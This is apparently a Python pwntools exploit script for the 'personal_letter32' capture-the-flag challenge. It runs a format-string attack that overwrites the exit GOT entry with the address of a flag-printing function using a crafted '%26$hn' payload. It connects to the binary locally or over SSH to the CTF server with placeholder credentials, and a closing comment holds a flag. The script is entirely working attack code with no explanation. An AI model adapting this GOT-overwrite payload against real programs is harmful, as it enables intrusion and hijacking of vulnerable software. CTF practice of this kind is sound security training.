from pwn import *
import time
import sys

def personal_letter32(DEBUG):
	
	if DEBUG=="1":
		t = 0.005
		r = process("./personal_letter32")
		raw_input("debug?")
	elif DEBUG=="2":
		s = ssh(host='shell.angstromctf.com', user='teamXXXX', password='XXXXXXX')
		s.set_working_directory('/problems/letter')
		r = s.process('./personal_letter32')
	printFlag = 0x0804872B
	exit_got = 0x804A030
	offset = 26
	r.recvuntil("Enter Name (100 Chars max): ")
	payload = p32(exit_got)
	payload += "%"+str((printFlag&0xffff)-12)+"u"+"%26$hn"
	r.sendline(payload)
	
	r.interactive()

personal_letter32(sys.argv[1])
# Here's a flag: actf{flags_are_fun}